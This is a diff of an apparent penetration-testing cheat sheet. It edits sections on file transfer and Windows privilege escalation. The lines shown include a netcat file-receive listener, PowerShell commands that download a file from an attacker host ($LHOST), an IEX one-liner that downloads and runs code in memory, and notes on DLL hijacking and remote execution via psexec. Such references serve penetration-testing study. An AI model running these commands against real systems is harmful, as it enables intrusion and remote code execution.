@@ -174,7 +174,7 @@ To get file
 nc -lp 8888 > outfile
 ```
 ### Windows Powershell
-```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', 'outfile')``` <- download file to disk\
+```powershell (New-Object Net.WebClient).DownloadFile('$LHOST/file', '$PATH\outfile')``` <- download file to disk\
 ```powershell "IEX(New-Object Net.WebClient).downloadString('$LHOST/file')"``` <- download and exec on memory
 
 ### Certutil
@@ -545,7 +545,7 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation
 
 **Auto enumerate with (enum script of choice here:)** ```winPEAS.exe```
 
-**Check loaded libraries --> potential DLL hijacking**
+**Check loaded libraries --> potential DLL hijacking <-- need to restart the service/reboot the machine**
 
 **Execute command remotely on Remote Windows target via SMB Creds with winexe or psexec.py from Local Kali machine**
 ```
